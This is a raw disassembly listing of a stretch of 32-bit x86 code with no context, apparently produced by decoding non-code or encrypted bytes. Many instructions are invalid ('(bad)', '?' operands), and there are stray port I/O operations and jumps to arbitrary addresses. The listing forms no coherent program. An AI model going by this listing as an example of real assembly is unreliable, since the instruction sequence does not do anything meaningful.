  42ac3c:	dec    cl
  42ac3e:	clc    
  42ac3f:	cdq    
  42ac40:	sar    ch,cl
  42ac42:	in     eax,dx
  42ac43:	pop    edi
  42ac44:	clc    
  42ac45:	sub    cx,WORD PTR [esi+ebx*4]
  42ac49:	mov    ebx,esi
  42ac4b:	repz push esp
  42ac4d:	dec    ecx
  42ac4e:	loopne 0x42ac86
  42ac50:	xor    eax,0xf412b84b
  42ac55:	pmaxsw mm2,QWORD PTR [edx+0x49fdbfbc]
  42ac5c:	imul   esi,DWORD PTR [ecx-0x6b9e5f09],0x3f
  42ac63:	je     0x42aca0
  42ac65:	test   al,0xcb
  42ac67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ac68:	pop    ebp
  42ac69:	ins    BYTE PTR es:[edi],dx
  42ac6a:	lds    ebp,FWORD PTR [ebx+0x13113be9]
  42ac70:	sahf   
  42ac71:	xchg   esp,eax
  42ac72:	stos   BYTE PTR es:[edi],al
  42ac73:	mov    eax,ds:0xb162fb25
  42ac78:	sbb    edi,DWORD PTR [edx-0x4c]
  42ac7b:	jo     0x42ac9e
  42ac7d:	cdq    
  42ac7e:	out    dx,al
  42ac7f:	es mov al,0xac
  42ac82:	ret    0x76e
  42ac85:	adc    ch,BYTE PTR [esi]
  42ac87:	test   al,0x4e
  42ac89:	pcmpgtd mm1,mm3
  42ac8c:	and    dh,cl
  42ac8e:	xor    BYTE PTR ds:0x53b07076,0x5e
  42ac95:	jae    0x42acb3
  42ac97:	cmp    edi,esp
  42ac99:	xor    al,0x77
  42ac9b:	mov    ss,WORD PTR [ebx]
  42ac9d:	popa   
  42ac9e:	mov    ebp,0x82f0ce1f
  42aca3:	ins    DWORD PTR es:[edi],dx
  42aca4:	shr    BYTE PTR [ebp+0x6099c8b6],1
  42acaa:	mov    DWORD PTR [eax+0x3c],eax
  42acad:	or     dh,BYTE PTR [edx*8+0x27ec6147]
  42acb4:	dec    edi
  42acb5:	add    al,0xe8
  42acb7:	mov    BYTE PTR [edx-0x277b180a],bh
  42acbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42acbe:	cdq    
  42acbf:	inc    esi
  42acc0:	mov    ebp,0x6a8f96c5
  42acc5:	adc    BYTE PTR [edx-0x5f],dl
  42acc8:	es repz pop ebx
  42accb:	cmovg  edi,edx
  42acce:	xlat   BYTE PTR ds:[ebx]
  42accf:	imul   ebx,DWORD PTR [esi+0xe],0x45
  42acd3:	push   eax
  42acd4:	mov    eax,ds:0x34151443
  42acd9:	mov    ebx,0xe2eca14f
  42acde:	jno    0x42ad23
  42ace0:	mov    esi,0x5e6dc00a
  42ace5:	or     eax,0xac3e7804
  42acea:	or     cl,ah
  42acec:	addr16 popa 
  42acee:	shl    DWORD PTR [ebx-0xb8658a5],0xd4
  42acf5:	and    DWORD PTR [esi+0x2c],0x5e
  42acf9:	pop    ebx
  42acfa:	mov    al,0x98
  42acfc:	mov    ?,ebp
  42acfe:	loop   0x42ad63
  42ad00:	loop   0x42ad30
  42ad02:	faddp  st(4),st
  42ad04:	mov    ebp,0xc3a1596d
  42ad09:	and    BYTE PTR [ebp+0x65],0x36
  42ad0d:	imul   bh
  42ad0f:	sbb    DWORD PTR [eax+0x5e92e685],ebx
  42ad15:	lea    ebx,ds:0xe8a0b549
  42ad1b:	mov    al,ds:0xba0c55a7
  42ad20:	shl    BYTE PTR [ebx+esi*2-0x1a],1
  42ad24:	push   edx
  42ad25:	or     ah,BYTE PTR [esi-0x6d8a6299]
  42ad2b:	out    dx,eax
  42ad2c:	sbb    BYTE PTR [edi-0x22],al
  42ad2f:	icebp  
  42ad30:	ja     0x42ad92
  42ad32:	stos   BYTE PTR es:[edi],al
  42ad33:	mov    cs,WORD PTR [edx-0x65a19a4a]
  42ad39:	sbb    ah,bl
  42ad3b:	jg     0x42ad98
  42ad3d:	jmp    0xb8618122
  42ad42:	(bad)  
  42ad43:	fild   WORD PTR [esi-0x6b]
  42ad46:	frstor [eax-0x5e65811]
  42ad4c:	sahf   
  42ad4d:	pop    ebp
  42ad4e:	jns    0x42adaa
  42ad50:	jl     0x42ad7b
  42ad52:	sti    
  42ad53:	xchg   ecx,eax
  42ad54:	xchg   BYTE PTR [edx-0x13],bh
  42ad57:	retf   
  42ad58:	test   DWORD PTR [edx-0x5e118455],0x609586a7
  42ad62:	call   0x4a9b:0xcd4c1844
  42ad69:	iret   
  42ad6a:	add    dl,BYTE PTR [ecx]
  42ad6c:	and    DWORD PTR [esi],esp
  42ad6e:	out    dx,al
  42ad6f:	mov    bl,0x13
  42ad71:	mov    ch,0x6
  42ad73:	inc    ebx
  42ad74:	(bad)  
  42ad75:	pusha  
  42ad76:	cmc    
  42ad77:	js     0x42ad26
  42ad79:	cdq    
  42ad7a:	test   al,0xcc
  42ad7c:	push   0xcbf8eeed
  42ad81:	pop    edx
  42ad82:	fcmovbe st,st(0)
  42ad84:	out    dx,al
  42ad85:	cmp    DWORD PTR [ebx+0x16],edx
  42ad88:	fimul  WORD PTR [ebx+0x3c]
  42ad8b:	jle    0x42ad9c
  42ad8d:	mov    dl,0x56
  42ad8f:	and    ebx,DWORD PTR [esi-0xd]
  42ad92:	jno    0x42add9
  42ad94:	adc    ecx,ecx
  42ad96:	test   BYTE PTR [edx],dh
  42ad98:	arpl   WORD PTR [ecx+0x61],sp
  42ad9b:	add    DWORD PTR [esi-0x3b],eax
  42ad9e:	call   edi
  42ada0:	jne    0x42ad2a
  42ada2:	cld    
  42ada3:	sub    eax,DWORD PTR ds:0xbcfeee8f
  42ada9:	loopne 0x42adc0
  42adab:	xchg   ebp,eax
  42adac:	cmp    BYTE PTR [ebx-0x6c],ah
  42adaf:	repz cmp BYTE PTR [edx],dh
  42adb2:	fsub   QWORD PTR [eax+0x7d374b6c]
  42adb8:	push   0x37
  42adba:	div    DWORD PTR [ebx-0x3d0a298a]
  42adc0:	xchg   edi,eax
  42adc1:	dec    edi
  42adc2:	out    0xcd,al
  42adc4:	pop    ebx
  42adc5:	dec    esi
  42adc6:	push   cs
  42adc7:	loope  0x42ad70
  42adc9:	stc    
  42adca:	sub    dh,BYTE PTR [eax]
  42adcc:	pop    esi
  42adcd:	push   esi
  42adce:	outs   dx,DWORD PTR ds:[esi]
  42adcf:	enter  0x9031,0x93
  42add3:	jmp    0x42addd
  42add5:	popa   
  42add6:	mov    bh,0xd2
  42add8:	inc    ecx
  42add9:	inc    ebx
  42adda:	push   eax
  42addb:	in     al,dx
  42addc:	or     DWORD PTR ds:0x6e626910,ebp
  42ade2:	jmp    0x42ae1d
  42ade4:	ins    DWORD PTR es:[edi],dx
  42ade5:	jne    0x42ad8a
  42ade7:	adc    DWORD PTR [ecx],eax
  42ade9:	mov    ecx,DWORD PTR [ecx+0x28f1bda1]
  42adef:	(bad)  
  42adf0:	aas    
  42adf1:	push   ds
  42adf2:	jo     0x42ae10
  42adf4:	pop    esi
  42adf5:	fs jne 0x42adcf
  42adf8:	mov    DWORD PTR ds:0x6163b10a,edi
  42adfe:	cmp    eax,0x351d158b
  42ae03:	push   edi
  42ae04:	pushf  
  42ae05:	dec    ebx
  42ae06:	add    ch,BYTE PTR [ebx+eiz*4]
  42ae09:	test   eax,0x95b978ac
  42ae0e:	sbb    eax,0xb28f0901
  42ae13:	mov    al,ds:0x13532bbe
  42ae18:	(bad)  
  42ae19:	and    eax,0x765eb2fe
  42ae1e:	shr    BYTE PTR [eax+0x53b1d312],cl
  42ae24:	inc    DWORD PTR [esp+ecx*2+0x5e]
  42ae28:	add    DWORD PTR ds:0x66fc99e2,edx
  42ae2e:	sti    
  42ae2f:	xchg   ebp,eax
  42ae30:	lds    eax,FWORD PTR [esi-0x1]
  42ae33:	sbb    BYTE PTR [esi+0x50bf0deb],bl
  42ae39:	in     eax,0x46
  42ae3b:	xchg   ebx,eax
  42ae3c:	or     BYTE PTR [ebp+0x5e96a26a],dl
  42ae42:	mov    bh,BYTE PTR [edi-0x2b]
  42ae45:	mov    ecx,fs
  42ae47:	fstp   QWORD PTR [esi-0x53]
  42ae4a:	xor    al,0x7e
  42ae4c:	call   ebx
  42ae4e:	and    ecx,ecx
  42ae50:	shr    DWORD PTR [esi-0x3225edf],1
  42ae56:	stos   DWORD PTR es:[edi],eax
  42ae57:	into   
  42ae58:	add    al,0x9a
  42ae5a:	push   ds
  42ae5b:	test   eax,0xb722a1ae
  42ae60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ae61:	mov    eax,ds:0x3b19aeee
  42ae66:	push   edx
  42ae67:	sbb    DWORD PTR [edx+0x298386f],edi
  42ae6d:	pop    edi
  42ae6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ae6f:	test   al,0x76
  42ae71:	pop    esp
  42ae72:	lahf   
  42ae73:	icebp  
  42ae74:	push   ss
  42ae75:	sbb    bl,BYTE PTR [esi-0xf68a141]
  42ae7b:	inc    ebp
  42ae7c:	mov    al,0x1f
  42ae7e:	adc    DWORD PTR [esi],0x677d5227
  42ae84:	fistp  DWORD PTR [edx]
  42ae86:	into   
  42ae87:	and    al,0x49
  42ae89:	and    dl,BYTE PTR [ecx+0x763e5e48]
  42ae8f:	imul   ecx,DWORD PTR [ebp+0x2f2a36d1],0x61fff761
  42ae99:	scas   eax,DWORD PTR es:[edi]
  42ae9a:	xchg   edi,eax
  42ae9b:	gs pop ecx
  42ae9e:	out    dx,al
  42ae9f:	mov    dh,0xf0
  42aea1:	out    0x9f,al
  42aea3:	(bad)  
  42aea4:	jg     0x42ae92
  42aea6:	mov    ax,ds:0xefd3c97d
  42aeac:	(bad)  
  42aead:	ret    
  42aeae:	in     eax,0xd2
  42aeb0:	pop    esi
  42aeb1:	enter  0x1f91,0x62
  42aeb5:	push   edi
  42aeb6:	daa    
  42aeb7:	sub    bl,BYTE PTR [ecx]
  42aeb9:	pusha  
  42aeba:	shr    BYTE PTR [edi],cl
  42aebc:	(bad)  
  42aebd:	xor    ch,dl
  42aebf:	mov    ds:0x516420ff,eax
  42aec4:	pushf  
  42aec5:	outs   dx,BYTE PTR ds:[esi]
  42aec6:	out    dx,al
  42aec7:	test   al,0x9
  42aec9:	fsubr  DWORD PTR [ebp+0x44d6c8ea]
  42aecf:	mov    eax,ds:0x6e8da78a
  42aed4:	xor    eax,0x5e008e13
  42aed9:	in     eax,0x90
  42aedb:	xor    dh,BYTE PTR [eax+0x8]
  42aede:	and    dh,al
  42aee0:	sub    eax,0x3d96ef61
  42aee5:	pushf  
  42aee6:	jno    0x42ae82
  42aee8:	lea    eax,[edx+eiz*1]
  42aeeb:	adc    bl,BYTE PTR [eax-0x1f]
  42aeee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aeef:	in     al,0x4a
  42aef1:	sub    ecx,DWORD PTR [ebp-0x5e]
  42aef4:	imul   esp,DWORD PTR [eax+0x6f],0xffffffd1
  42aef8:	and    eax,0xf03742e0
  42aefd:	ss out dx,al
  42aeff:	or     al,0xa9
  42af01:	mov    ecx,0x8e49e19a
  42af06:	inc    ebx
  42af07:	(bad)
  42af0b:	mov    eax,ds:0x14173841
  42af10:	jbe    0x42aed4
  42af12:	out    dx,al
  42af13:	sar    ch,1
  42af15:	loop   0x42aee6
  42af17:	loop   0x42af20
  42af19:	xor    DWORD PTR [edx-0x12],edi
  42af1c:	stc    
  42af1d:	pusha  
  42af1e:	jne    0x42af64
  42af20:	outs   dx,BYTE PTR ds:[esi]
  42af21:	inc    esp
  42af22:	fld    TBYTE PTR [ebx-0x5]
  42af25:	jo     0x42af15
  42af27:	and    eax,0x32e20f1f
  42af2c:	jl     0x42af17
  42af2e:	js     0x42aebf
  42af30:	iret   
  42af31:	(bad)  
  42af32:	dec    esp
  42af33:	loope  0x42af39
  42af35:	mov    al,0x93
  42af37:	jmp    0xf142:0x9fe7f808
  42af3e:	xor    BYTE PTR [eax+0x2e],ah
  42af41:	jle    0x42afb7
  42af43:	or     eax,0x65a3612d
  42af48:	pop    es
  42af49:	loop   0x42afa9
  42af4b:	loope  0x42aed9
  42af4d:	mov    esi,0x8230f8ee
  42af52:	or     eax,0xa6be4aa5
  42af57:	fwait
  42af58:	pop    ss
  42af59:	add    BYTE PTR [esi+0x1560956a],dl
  42af5f:	test   eax,0x2581f259
  42af64:	pop    esi
  42af65:	xor    ebx,DWORD PTR [esi]
  42af67:	cli    
  42af68:	daa    
  42af69:	call   0x60fd94d4
  42af6e:	xchg   ebx,eax
  42af6f:	pop    ss
  42af70:	dec    ebx
  42af71:	xor    esp,ebx
  42af73:	push   ds
  42af74:	jg     0x42afeb
  42af76:	jmp    0xdbd1:0x8d316d6c
  42af7d:	xor    DWORD PTR [esi-0x37],ebx
  42af80:	inc    ebx
  42af81:	sbb    eax,0xb677a0e7
  42af86:	adc    eax,0x1b3036e6
  42af8b:	add    eax,0x2c02df5e
  42af90:	imul   DWORD PTR [eax+edx*4]
  42af93:	add    ecx,edi
  42af95:	pop    ecx
  42af96:	shr    DWORD PTR gs:[ebx],cl
  42af99:	ror    DWORD PTR [edx+0x41],cl
  42af9c:	out    dx,al
  42af9d:	fs mov eax,0x4e755e4d
  42afa3:	xor    DWORD PTR [esi],edx
  42afa5:	outs   dx,BYTE PTR ds:[esi]
  42afa6:	shr    BYTE PTR [esi],cl
  42afa8:	pop    eax
  42afa9:	popa   
  42afaa:	lea    ebp,ds:0xa6b5dfdc
  42afb0:	test   eax,0x36b701aa
  42afb5:	adc    ebp,DWORD PTR [esi]
  42afb7:	retf   0xa808
  42afba:	mov    dh,0x3b
  42afbc:	inc    eax
  42afbd:	popa   
  42afbe:	out    dx,eax
  42afbf:	test   BYTE PTR [ecx+0x6e8d9296],al
  42afc5:	jmp    0x7979618
  42afca:	loop   0x42afa1
  42afcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42afcd:	stos   DWORD PTR es:[edi],eax
  42afce:	and    eax,ecx
  42afd0:	je     0x42b002
  42afd2:	fstp   TBYTE PTR [esi+0x6b812adf]
  42afd8:	aam    0x28
  42afda:	mov    esp,0x19b9fca3
  42afdf:	xchg   BYTE PTR [ebp-0x41],dl
  42afe2:	jbe    0x42af84
  42afe4:	push   esi
  42afe5:	int3   
  42afe6:	out    dx,al
  42afe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42afe8:	jp     0x42b050
  42afea:	or     dl,ah
  42afec:	in     eax,0x20
  42afee:	push   ebx
  42afef:	stos   BYTE PTR es:[edi],al
  42aff0:	mov    eax,0x71ebee73
  42aff5:	ja     0x42b075
  42aff7:	xchg   al,dh
  42aff9:	loopne 0x42afe9
  42affb:	inc    esi
  42affc:	int    0xbf
  42affe:	lds    edi,FWORD PTR [eax]
  42b000:	dec    esp
  42b001:	lods   al,BYTE PTR ds:[esi]
  42b002:	icebp  
  42b003:	mov    al,ds:0xecbe7c56
  42b008:	imul   cl
  42b00a:	and    DWORD PTR [edi],0xfffffff3
  42b00d:	mov    ch,0xf3
  42b00f:	(bad)  
  42b010:	out    0xc4,al
  42b012:	mov    WORD PTR [ebp-0x1c],cs
  42b015:	pusha  
  42b016:	mov    ds:0xe00d9dc1,eax
  42b01b:	mov    ds:0xa27c5150,eax
  42b020:	and    al,0x19
  42b022:	push   0xffffff81
  42b024:	xchg   edx,eax
  42b025:	xchg   esi,eax
  42b026:	dec    eax
  42b027:	ret    0xb98b
  42b02a:	ss mov ah,0xb3
  42b02d:	adc    al,0x62
  42b02f:	jbe    0x42b08f
  42b031:	mov    ds:0xc940ca91,eax
  42b036:	call   0xd4640f1f
  42b03b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b03c:	and    eax,ecx
  42b03e:	nop
  42b03f:	sub    eax,0xe49651ea
  42b044:	xchg   ebp,eax
  42b045:	jp     0x42aff5
  42b047:	aam    0xbb
  42b049:	rcr    DWORD PTR [eax+ebx*8],1
  42b04c:	pop    edi
  42b04d:	jmp    0x42b0b4
  42b04f:	retf   
  42b050:	clc    
  42b051:	lea    ecx,[edx+0x71]
  42b054:	fstp   TBYTE PTR [esi]
  42b056:	jb     0x42aff9
  42b058:	adc    al,0x32
  42b05a:	push   eax
  42b05b:	lea    esi,[edi-0x56]
  42b05e:	push   ecx
  42b05f:	cmp    eax,0x890cd95a
  42b064:	mov    bl,0xfb
  42b066:	cmp    DWORD PTR cs:[ecx+0x4d77942c],esi
  42b06d:	popa   
  42b06e:	jnp    0x42affd
  42b070:	in     al,0xad
  42b072:	push   0x238a3a23
  42b077:	inc    edi
  42b078:	jns    0x42b05a
  42b07a:	xor    DWORD PTR [esi-0xd],0x5da691ce
  42b081:	popa   
  42b082:	call   0xa942:0xd424b953
  42b089:	inc    edi
  42b08a:	dec    esi
  42b08b:	rcr    DWORD PTR [esi-0x3],cl
  42b08e:	mov    bl,0xb6
  42b090:	inc    esi
  42b091:	outs   dx,DWORD PTR ds:[esi]
  42b092:	lods   eax,DWORD PTR ds:[esi]
  42b093:	jb     0x42b089
  42b095:	pusha  
  42b096:	(bad)  
  42b097:	loop   0x42b0d7
  42b099:	js     0x42b0d9
  42b09b:	xchg   ebp,eax
  42b09c:	jae    0x42b0f8
  42b09e:	lock add al,0x2f
  42b0a1:	(bad)  
  42b0a2:	stc    
  42b0a3:	add    BYTE PTR [ecx+0x6e48dde1],bh
  42b0a9:	pusha  
  42b0aa:	push   ss
  42b0ab:	mov    edi,0x9eb56ed9
  42b0b0:	sub    al,0x27
  42b0b2:	out    dx,al
  42b0b3:	div    BYTE PTR [ebp+0x0]
  42b0b6:	ja     0x42b0ec
  42b0b8:	lea    eax,[ebx+0x4adfa8a5]
  42b0be:	(bad)  
  42b0bf:	out    dx,eax
  42b0c0:	pop    ss
  42b0c1:	and    DWORD PTR [ebx],esp
  42b0c3:	das    
  42b0c4:	fwait
  42b0c5:	lahf   
  42b0c6:	out    dx,al
  42b0c7:	fisttp WORD PTR [edx]
  42b0c9:	(bad)  
  42b0ca:	cmp    bl,ah
  42b0cc:	add    esi,DWORD PTR [esi]
  42b0ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b0cf:	mov    al,ds:0xab5cbe11
  42b0d4:	or     al,0x49
  42b0d6:	shl    BYTE PTR [ebx+0x2155d45e],1
  42b0dc:	nop
  42b0dd:	add    al,0xc5
  42b0df:	aad    0x75
  42b0e1:	pusha  
  42b0e2:	push   esi
  42b0e3:	out    dx,al
  42b0e4:	ins    DWORD PTR es:[edi],dx
  42b0e5:	stc    
  42b0e6:	shl    DWORD PTR [eax+0x7a],cl
  42b0e9:	imul   ebp,ebp,0x4275e12d
  42b0ef:	test   BYTE PTR [ebx],bl
  42b0f1:	or     ebp,DWORD PTR [edx]
  42b0f3:	cmp    ebx,ebp
  42b0f5:	add    al,0xeb
  42b0f7:	xor    eax,0x7a637b5e
  42b0fc:	inc    ebx
  42b0fd:	dec    esp
  42b0fe:	repnz or eax,0x300dd05d
  42b104:	iret   
  42b105:	aad    0xea
  42b107:	ret    
  42b108:	cdq    
  42b109:	aaa    
  42b10a:	inc    esi
  42b10b:	rol    ecx,cl
  42b10d:	inc    ebx
  42b10e:	sub    BYTE PTR [esp+ecx*2-0x62],0x6a
  42b113:	out    dx,al
  42b114:	(bad)  
  42b115:	lds    ebx,FWORD PTR [esi+0x28]
  42b118:	adc    ah,cl
  42b11a:	call   0x93497125
  42b11f:	sub    eax,DWORD PTR [edx+eax*2+0x12340fd8]
  42b126:	sbb    ch,bl
  42b128:	push   ds
  42b129:	push   ebx
  42b12a:	add    ch,0xb
  42b12d:	call   0x3604b20
  42b132:	es call 0xa183478e
  42b138:	popf   
  42b139:	push   esi
  42b13a:	xor    al,0xbe
  42b13c:	arpl   WORD PTR [edi+0x78],si
  42b13f:	cmp    eax,0xa31bb45e
  42b144:	pop    ss
  42b145:	or     al,0x15
  42b147:	add    edi,ecx
  42b149:	mov    eax,ds:0x60c92fce
  42b14e:	jl     0x42b1bc
  42b150:	stc    
  42b151:	test   eax,0x47cb7b0c
  42b156:	jmp    0xd98f:0x47c4230
  42b15d:	and    esi,ebp
  42b15f:	je     0x42b1aa
  42b161:	(bad)  
  42b162:	fwait
  42b163:	int    0x2
  42b165:	popa   
  42b166:	scas   al,BYTE PTR es:[edi]
  42b167:	pop    es
  42b168:	imul   ecx,DWORD PTR [edi+esi*1],0x17ae5c
  42b16f:	fwait
  42b170:	call   0x7be200e
  42b175:	pop    ds
  42b176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b177:	outs   dx,BYTE PTR ds:[esi]
  42b178:	xchg   esi,eax
  42b179:	mov    BYTE PTR [bx+si],dl
  42b17c:	fisubr WORD PTR [ecx+ebp*4+0x7498cfc0]
  42b183:	outs   dx,DWORD PTR ds:[esi]
  42b184:	pop    esi
  42b185:	rol    DWORD PTR [ebx+0xca15ad2],0x37
  42b18c:	mov    dh,0x60
  42b18e:	aas    
  42b18f:	mov    eax,DWORD PTR [eax-0xdcc32bd]
  42b195:	add    bh,ch
  42b197:	xor    cl,dl
  42b199:	cmp    BYTE PTR [ecx],0xfd
  42b19c:	leave  
  42b19d:	repz mov ecx,0x933dada0
  42b1a3:	test   eax,0x7447b45c
  42b1a8:	jge    0x42b12e
  42b1aa:	jae    0x42b17b
  42b1ac:	mov    BYTE PTR [ebx],al
  42b1ae:	mov    ?,WORD PTR [edi]
  42b1b0:	mov    ds:0xd8f1ee1f,al
  42b1b5:	mov    dh,0xbb
  42b1b7:	push   ecx
  42b1b8:	dec    ebp
  42b1b9:	pop    es
  42b1ba:	enter  0x3ba1,0x23
  42b1be:	adc    al,0xc6
  42b1c0:	or     BYTE PTR [ebp+0x5],bh
  42b1c3:	ja     0x42b1e2
  42b1c5:	and    al,0x79
  42b1c7:	gs stos DWORD PTR es:[edi],eax
  42b1c9:	xor    ebp,ebp
  42b1cb:	mov    ds:0xca211e30,eax
  42b1d0:	mov    eax,0x48563e9b
  42b1d5:	daa    
  42b1d6:	scas   eax,DWORD PTR es:[edi]
  42b1d7:	mov    al,ds:0xe39c4aae
  42b1dc:	call   0x5f11edbc
  42b1e1:	xor    BYTE PTR [eax-0x32b23136],ah
  42b1e7:	sub    bl,bh
  42b1e9:	pusha  
  42b1ea:	mov    WORD PTR [eax+0x5703b6e3],cs
  42b1f0:	inc    esp
  42b1f1:	mov    eax,ds:0xa32ea2ee
  42b1f6:	and    eax,0x19553884
  42b1fb:	lahf   
  42b1fc:	(bad)  
  42b1fd:	ins    BYTE PTR es:[edi],dx
  42b1fe:	fist   WORD PTR [edx+0x5e]
  42b201:	sbb    BYTE PTR [ebx-0x119b968b],0x7b
  42b208:	pushf  
  42b209:	in     al,0x86
  42b20b:	push   es
  42b20c:	cmp    edi,esi
  42b20e:	out    0xa0,al
  42b210:	push   ds
  42b211:	jp     0x42b1b4
  42b213:	(bad)  
  42b214:	mov    eax,ds:0x5ede8ff8
  42b219:	ins    BYTE PTR es:[edi],dx
  42b21a:	repz dec ebx
  42b21c:	out    dx,eax
  42b21d:	(bad)  
  42b21f:	pop    esi
  42b220:	jl     0x42b20a
  42b222:	jns    0x42b245
  42b224:	mov    al,ds:0x63a3d2ec
  42b229:	dec    ebp
  42b22a:	fldenv [edi-0x74790380]
  42b230:	or     ebx,DWORD PTR [esi-0x4ca11421]
  42b236:	and    bl,dl
  42b238:	xor    eax,0xe5b414ed
  42b23d:	pop    ecx
  42b23e:	jp     0x42b24a
  42b240:	or     bh,BYTE PTR [ecx-0x1b]
  42b243:	push   eax
  42b244:	mov    WORD PTR [eax-0x2fa1152e],?
  42b24a:	fistp  QWORD PTR [ebp+0x44]
  42b24d:	adc    al,0x98
  42b24f:	into   
  42b250:	mul    DWORD PTR [edx-0x40]
  42b253:	pop    esi
  42b254:	pop    esi
  42b255:	pushf  
  42b256:	mov    bl,0x3d
  42b258:	sub    esi,0x44
  42b25b:	lahf   
  42b25c:	pop    ebp
  42b25d:	jmp    FWORD PTR [edx+0x6eb0902]
  42b263:	into   
  42b264:	(bad)  
  42b266:	and    al,0x6d
  42b268:	inc    esi
  42b269:	pop    ss
  42b26a:	sub    eax,0xe62caebe
  42b26f:	rcr    BYTE PTR [esi+0x4a],0x78
  42b273:	shl    bl,cl
  42b275:	push   esi
  42b276:	inc    esi
  42b277:	bnd js 0x42b2da
  42b27a:	data16 add al,BYTE PTR [ebx]
  42b27d:	dec    eax
  42b27e:	mov    bl,0xc7
  42b280:	jg     0x42b2f4
  42b282:	out    dx,al
  42b283:	repnz push ss
  42b285:	adc    ch,BYTE PTR [esi]
  42b287:	jno    0x42b263
  42b289:	(bad)  
  42b28a:	fsub   DWORD PTR [eax+0x3bfc3890]
  42b290:	js     0x42b30b
  42b292:	int3   
  42b293:	popa   
  42b294:	pop    esi
  42b295:	inc    edx
  42b296:	mov    edx,0x71fe4d37
  42b29b:	iret   
  42b29c:	out    0x55,al
  42b29e:	xor    ebx,0xc36ef3b5
  42b2a4:	mov    ds:0x5e977e26,eax
  42b2a9:	pop    ebp
  42b2aa:	in     al,dx
  42b2ab:	xchg   esp,eax
  42b2ac:	cmp    eax,0xae8f9618
  42b2b1:	pop    ecx
  42b2b2:	adc    esi,DWORD PTR [ecx+0x33]
  42b2b5:	loopne 0x42b248
  42b2b7:	loope  0x42b260
  42b2b9:	xor    BYTE PTR [esi-0x11d731e9],ah
  42b2bf:	or     al,0xbf
  42b2c1:	pop    ebp
  42b2c2:	retf   0x6bb4
  42b2c5:	push   es
  42b2c6:	in     al,dx
  42b2c7:	mov    al,ds:0x616632a2
  42b2cc:	jne    0x42b25b
  42b2ce:	jl     0x42b2c6
  42b2d0:	pop    edx
  42b2d1:	inc    ebx
  42b2d2:	shl    DWORD PTR [ecx],1
  42b2d4:	pop    ebx
  42b2d5:	jecxz  0x42b276
  42b2d7:	lahf   
  42b2d8:	call   0xf698:0xb885ce5c
  42b2df:	dec    ebp
  42b2e0:	sbb    BYTE PTR [edx-0x2a1355e],bl
  42b2e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b2e7:	ins    DWORD PTR es:[edi],dx
  42b2e8:	fcomp  st(3)
  42b2ea:	xchg   esi,eax
  42b2eb:	loope  0x42b34b
  42b2ed:	add    esp,DWORD PTR [ebx]
  42b2ef:	retf   0xc632
  42b2f2:	mov    BYTE PTR [edi-0x6d2f3f8d],0xb5
  42b2f9:	mov    ebx,0x9deaa0a9
  42b2fe:	outs   dx,BYTE PTR ds:[esi]
  42b2ff:	je     0x42b2f5
  42b301:	aaa    
  42b302:	mov    dl,0xd7
  42b304:	or     BYTE PTR [ecx+0x27],ah
  42b307:	dec    edx
  42b308:	inc    eax
  42b309:	jl     0x42b30e
  42b30b:	paddb  mm4,QWORD PTR [eax-0x3a]
  42b30f:	or     ebp,esp
  42b311:	ror    DWORD PTR [edi+0x91d94e],cl
  42b317:	pop    esi
  42b318:	rcl    ch,0x2e
  42b31b:	gs xchg ebp,eax
  42b31d:	out    0x61,al
  42b31f:	retf   0x694a
  42b322:	inc    edx
  42b323:	jg     0x42b384
  42b325:	aad    0x64
  42b327:	xchg   ecx,eax
  42b328:	aam    0xf6
  42b32a:	pop    esi
  42b32b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b32c:	ds mov edi,edi
  42b32f:	inc    edi
  42b330:	call   0x9f31b45d
  42b335:	iret   
  42b336:	ins    DWORD PTR es:[edi],dx
  42b337:	lock mov bl,0xfc
  42b33a:	inc    eax
  42b33b:	mov    eax,ds:0x6db90552
  42b340:	outs   dx,BYTE PTR ds:[esi]
  42b341:	arpl   cx,bx
  42b343:	sahf   
  42b344:	repz add edx,0xa756630c
  42b34b:	push   ebx
  42b34c:	cwde   
  42b34d:	pop    ebp
  42b34e:	in     al,dx
  42b34f:	pop    esi
  42b350:	in     eax,0x60
  42b352:	sbb    ah,BYTE PTR [eax+0x334d48c0]
  42b358:	xor    al,bh
  42b35a:	in     eax,dx
  42b35b:	(bad)
  42b35f:	jle    0x42b344
  42b361:	mov    ebx,0x60ae6436
  42b366:	cli    
  42b367:	(bad)  
  42b368:	pop    eax
  42b369:	addr16 (bad) 
  42b36b:	jge    0x42b308
  42b36d:	sub    al,0xee
  42b36f:	sar    BYTE PTR [esi-0x1400457a],0x42
  42b376:	jno    0x42b31c
  42b378:	(bad)  
  42b37b:	fadd   DWORD PTR [esp+edx*2-0x66350962]
  42b382:	out    dx,al
  42b383:	push   eax
  42b384:	mov    bl,0x7f
  42b386:	pop    edi
  42b387:	add    eax,0xa15d7d95
  42b38c:	adc    al,cl
  42b38e:	adc    dh,dl
  42b390:	retf   
  42b391:	ins    DWORD PTR es:[edi],dx
  42b392:	push   es
  42b393:	mov    bl,0x64
  42b395:	je     0x42b40c
  42b397:	xor    DWORD PTR [edi+0x72],0x28
  42b39b:	popa   
  42b39c:	jmp    0xc7d0:0x7486c951
  42b3a3:	mov    al,ds:0x7e86f4b2
  42b3a8:	es push eax
  42b3aa:	pop    esi
  42b3ab:	and    BYTE PTR [esi-0x3b],bl
  42b3ae:	dec    edi
  42b3af:	in     eax,dx
  42b3b0:	daa    
  42b3b1:	sahf   
  42b3b2:	inc    ecx
  42b3b3:	xchg   ebx,eax
  42b3b4:	repz pusha 
  42b3b6:	aam    0x8e
  42b3b8:	mov    edi,0x3dde1de0
  42b3bd:	add    dh,BYTE PTR ds:[ebp+ecx*2+0xb]
  42b3c2:	sub    eax,0x386a16d0
  42b3c7:	out    0x92,al
  42b3c9:	jae    0x42b3e7
  42b3cb:	mov    eax,ds:0x664d480a
  42b3d0:	rcr    ebx,cl
  42b3d2:	outs   dx,DWORD PTR ds:[esi]
  42b3d3:	adc    edx,DWORD PTR [ebx-0x17]
